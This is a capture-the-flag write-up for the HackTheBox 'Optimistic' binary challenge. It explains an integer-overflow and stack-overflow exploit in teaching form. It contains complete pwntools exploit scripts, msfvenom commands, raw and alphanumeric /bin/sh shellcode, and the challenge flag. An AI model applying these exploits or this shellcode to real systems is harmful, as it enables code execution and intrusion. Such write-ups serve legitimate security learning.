# Optimistic
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ecdb4a23-d691-405a-843f-0c4b57122115)


## Lessons Learned:
1. Exploiting Integer Overflow.
2. Utilizing Integer Overflow to leak stack address.
3. Writing shellcode to the leaked stack address and manipulate the RIP address to it.

## DESCRIPTION:
Are you ready to feel positive?

## STEPS:
1. First, unzip the `.zip` file given, then check the type of file we got.

> RESULT - 64 BIT BINARY FILE - NOT STRIPPED

![image](https://user-images.githubusercontent.com/70703371/210699697-7c4031c0-514c-4ebb-9255-b381fd9978b4.png)


2. Now check the binary's protection.

> RESULT - NO CANARY FOUND (can lead to bufferoverflow) - NX DISABLED (Can inject shellcode)

![image](https://user-images.githubusercontent.com/70703371/210699746-4f8d9148-e1a7-4ff9-bbb0-9e24bcb1908d.png)


3. Let's run the binary then.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210699840-b6c4a59c-e4ea-4f03-b480-ecc17dbaa25a.png)


![image](https://user-images.githubusercontent.com/70703371/210699934-da4c8ea2-1eee-4028-ae31-19bd499b8519.png)


4. Hmm.. Let's decompile the binary and analyze the `main()` function.

> RESULT


![image](https://user-images.githubusercontent.com/70703371/210700095-aabbf8c3-c55f-4d37-b5d8-a7298735b4fe.png)


5. Seems like we need to find the offset of our stack pointer. Not only that now we know why the binary skipped the age prompt, it's because the email variable only accepts 8 characters.

![image](https://user-images.githubusercontent.com/70703371/210700522-b68eec46-47af-4878-9817-f5673b7a0de4.png)


![image](https://user-images.githubusercontent.com/70703371/210701868-099b344f-17eb-43c8-a812-7940fb416717.png)


6. The vuln here, `local_84` is an unsigned int, then converted to int and compared to another value. This could lead to **Interger Overflow**.

![image](https://user-images.githubusercontent.com/70703371/210701107-cc6dda28-e407-42d1-a1d9-06c7fae999d1.png)


![image](https://user-images.githubusercontent.com/70703371/210701129-27c9cf30-6bf7-48e1-ae97-9c7c32fa8944.png)


> QUICK INFO

![image](https://user-images.githubusercontent.com/70703371/210701790-af97a0c4-1635-41eb-a62c-3dc99cfe4d3e.png)


7. So let's run the binary in gbd.

> At this point, we know the unsigned int is ranged from 0 - 4,294,967,295, let's input `1` as the length.

![image](https://user-images.githubusercontent.com/70703371/210702097-59de7283-a312-4b67-9511-acbba2c672c1.png)


![image](https://user-images.githubusercontent.com/70703371/210702154-71e0d74c-7bb8-40ad-99b4-7597463d1476.png)


8. Hmm.. Confused why it's terminated, because it must only validating if the length is above 64.

![image](https://user-images.githubusercontent.com/70703371/210702300-93800603-883c-4577-b091-bdf11d2f3cc4.png)


9. Let's run the binary without gdb then.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210703200-fd995d5f-a764-4271-b2ca-10b80c5b0538.png)


10. Got segmentation fault!
11. Hmm.. let's try to get the EIP/RIP offset with pwntools then.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './optimistic'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def getOffset(pattern):
    sh = process(exe)
    sh.sendlineafter(':', 'y')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', '-1')
    sh.sendlineafter(':', pattern)
    sh.wait()
    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
    info('EIP/RIP offset : {i}'.format(i=offset))
    return offset

pattern = cyclic(1024)
offset = getOffset(pattern) # got 104

```

> OUTPUT - 104

![image](https://user-images.githubusercontent.com/70703371/210710680-f5a72419-550f-4687-82ac-b3880bb36c75.png)


12. Now we need to get the location of **EBP** (leak the stack address).

```py
# LEAK THE STACK ADDRESS
stackAddr = int(re.search(r"(0x[\w\d]+)", sh.recvlines()).group(0), 16)
info("Stack Address Leaked: %#x", stackAddr)

## remove 96 bytes to point at RSP instead of RBP | remove 96 bytes because `local_68` buffer is 96 bytes
stackAddr = stackAddr - 96
```

13. Now set the shellcode.

```py
## create the shellcode
shellcode = asm(shellcraft.sh())

## payload

p = flat(
    [
        shellcode,
        cyclic(offset - len(shellcode)), # as the padding bytes
        stackAddr
    ]
)
```

> THE SCRIPT SO FAR

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './optimistic'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def getOffset(pattern):
    sh = process(exe)
    sh.sendlineafter(':', 'y')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', '-1')
    sh.sendlineafter(':', pattern)
    sh.wait()
    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
    info('EIP/RIP offset : {i}'.format(i=offset))
    return offset

pattern = cyclic(1024)
offset = getOffset(pattern) # got 104

sh = start()

sh.sendlineafter(':', 'y')

# LEAK THE STACK ADDRESS
stackAddr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
info("Stack Address Leaked: %#x", stackAddr)

## remove 96 bytes to point at RSP instead of RBP | remove 96 bytes because `local_68` buffer is 96 bytes
stackAddr -= 96

## create the shellcode
shellcode = asm(shellcraft.sh())

## payload

p = flat(
    [
        shellcode,
        cyclic(offset - len(shellcode)), # as the padding bytes to RIP
        stackAddr # RBP - 96 (our shellcode)
    ]
)


sh.sendlineafter(':','aa')
sh.sendlineafter(':','aa')
sh.sendlineafter(':','-1')
sh.sendlineafter(':',p)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/210711260-8ad23947-9b7e-4bc5-b805-5c3c16f98279.png)


14. We got the shell here, but the problem is notice the shellcraft we sent are not alphanumeric.

![image](https://user-images.githubusercontent.com/70703371/210711400-c57caf8a-7c8f-4d86-b1f1-aab05a335ec6.png)


15. Let's try to `ls`.

![image](https://user-images.githubusercontent.com/70703371/210711447-3747d0ad-c9a2-436f-a15b-9165c85535b4.png)


16. Yep, it's must in alphanumeric. Remember we have this checker.

![image](https://user-images.githubusercontent.com/70703371/210711568-45d916aa-718e-4309-ac47-3243eb6c34e7.png)


17. So i did a small outsource on the internet, found out that we can do 3 methods.

```
The 1st & 2nd method is using msfvenom
The 3rd method simply search "linux alphanumeric shellcode" -> exploitdb | https://www.exploit-db.com/exploits/35205
```

> 1ST METHOD

```
COMMAND:
msfvenom -f python -p linux/x64/exec -a x86_64 --platform linux CMD=/bin/sh -e x86/alpha_mixed

COPY THE SHELL TO PYTHON

shellcode = b""
shellcode += b"\x89\xe2\xdb\xc2\xd9\x72\xf4\x58\x50\x59\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
shellcode += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
shellcode += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x32\x4a\x47\x4b\x76"
shellcode += b"\x38\x6d\x49\x37\x38\x4d\x6b\x34\x6f\x30\x62\x33\x59"
shellcode += b"\x50\x6e\x34\x6f\x44\x33\x62\x48\x65\x50\x51\x43\x61"
shellcode += b"\x58\x6b\x39\x78\x67\x72\x48\x76\x4d\x75\x33\x73\x30"
shellcode += b"\x37\x70\x50\x48\x6c\x49\x6d\x36\x52\x72\x58\x68\x73"
shellcode += b"\x38\x63\x30\x37\x70\x67\x70\x74\x6f\x33\x52\x52\x49"
shellcode += b"\x50\x6e\x66\x4f\x70\x73\x53\x58\x45\x50\x66\x36\x56"
shellcode += b"\x37\x70\x48\x4e\x69\x68\x66\x56\x6f\x43\x35\x41\x41"

```

> 2ND METHOD

```
COMMAND:
msfvenom -f python -p linux/x64/exec --platform linux CMD=/bin/sh

COPY THE SHELL TO PYTHON:

shellcode = b""
shellcode += b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
shellcode += b"\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61"
shellcode += b"\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05"
shellcode = alphanumeric(shellcode)
```


> EXPLOIT DB

![image](https://user-images.githubusercontent.com/70703371/210711911-06924b92-e385-4acd-90f0-8f0aba38d428.png)

```
XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V
```

18. For this solution i preferred to use the third method, because the 1st & 2nd i failed and found out need to change to python 2 environment.
19. Anyway i will show you step by step to get the payload.
20. Let's run this command first -> `msfvenom -l payloads | grep linux` to see all payloads for linux.
21. Let's use this one:

![image](https://user-images.githubusercontent.com/70703371/210713041-9ef09c84-dd37-4f64-a887-7676938be28e.png)


22. Since we want to convert the payload in python file, run this command -> `msfvenom -p linux/x64/exec -f python --platform linux CMD=/bin/sh`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210713254-b6c3c210-5624-489c-a6d9-5bb694c83cb9.png)


23. Copy that to our script.
24. Now let's go back and use the third method.

> FINAL SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './optimistic'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def getOffset(pattern):
    sh = process(exe)
    sh.sendlineafter(':', 'y')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', '-1')
    sh.sendlineafter(':', pattern)
    sh.wait()
    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
    info('EIP/RIP offset : {i}'.format(i=offset))
    return offset

pattern = cyclic(1024)
offset = getOffset(pattern) # got 104

sh = start()

sh.sendlineafter(':', 'y')

# LEAK THE STACK ADDRESS
stackAddr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
info("Stack Address Leaked: %#x", stackAddr)

## remove 96 bytes to point at RSP instead of RBP | remove 96 bytes because `local_68` buffer is 96 bytes
stackAddr -= 96


## create the shellcode - NEED PYTHON 2 ENV
##shellcode =  b""
##shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
##shellcode += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00"
##shellcode += b"\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e"
##shellcode += b"\x6a\x3b\x58\x0f\x05"
##shellcode = alphanumeric(shellcode)


shellcode = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"

## payload

p = flat(
    [
        shellcode,
        cyclic(offset - len(shellcode)), # as the padding bytes to RIP
        stackAddr # RBP - 96 (our shellcode)
    ]
)

sh.sendlineafter(':','aa')
sh.sendlineafter(':','aa')
sh.sendlineafter(':','-1')
sh.sendlineafter(':',p)

sh.interactive()

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/210714446-f4a9934a-2ace-45e6-b8c8-25dca79800f1.png)


![image](https://user-images.githubusercontent.com/70703371/210714489-66799572-8443-407a-901e-9def7ff168a1.png)


25. Great, let's test it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210714595-ddfb16c9-7672-489c-9edd-386fb5a6e587.png)


![image](https://user-images.githubusercontent.com/70703371/210714617-8152509a-ba9d-457d-aa47-a805143d3ad3.png)


![image](https://user-images.githubusercontent.com/70703371/210714688-9d251e23-ef2e-46f8-a517-a616ed7cded6.png)


26. Got the flag!

## FLAG

```
HTB{be1ng_negat1v3_pays_0ff!}
```





